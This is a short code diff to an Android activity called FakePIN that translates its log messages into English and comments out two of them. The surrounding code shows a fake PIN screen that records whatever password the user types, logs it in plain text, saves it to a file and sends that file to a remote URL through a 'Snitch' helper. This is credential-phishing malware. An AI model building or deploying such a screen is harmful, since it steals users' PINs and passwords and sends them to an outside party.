@@ -30,7 +30,7 @@ public class FakePIN extends AppCompatActivity {
             public boolean onEditorAction(TextView v, int actionId,
                                           KeyEvent event) {
                 if (actionId == EditorInfo.IME_ACTION_DONE) {
-                    Log.v("secme", "Password tapé " + pwField.getText());
+                    Log.v("secme", "Recorded password : " + pwField.getText());
                     try {
                         writeData((String.valueOf(pwField.getText())));
                     } catch (Exception e) {
@@ -49,11 +49,11 @@ public class FakePIN extends AppCompatActivity {
         File path = getApplicationContext().getFilesDir();
         File file = new File(path, PASS_FILENAME);
         Snitch snitch = new Snitch(this, URL);
-        Log.v("secme", "Password ecrit dans "+ file.getAbsolutePath());
+        Log.v("secme", "Password written in "+ file.getAbsolutePath());
 
         if (file.exists()) {
-            Log.v("secme", "Le fichier existe deja");
-            Log.v("secme", "Sending Request commemme");
+            //Log.v("secme", "Le fichier existe deja");
+            //Log.v("secme", "Sending Request commemme");
             snitch.sendWebRequest(file, "pin", "txt");
             return;
         }
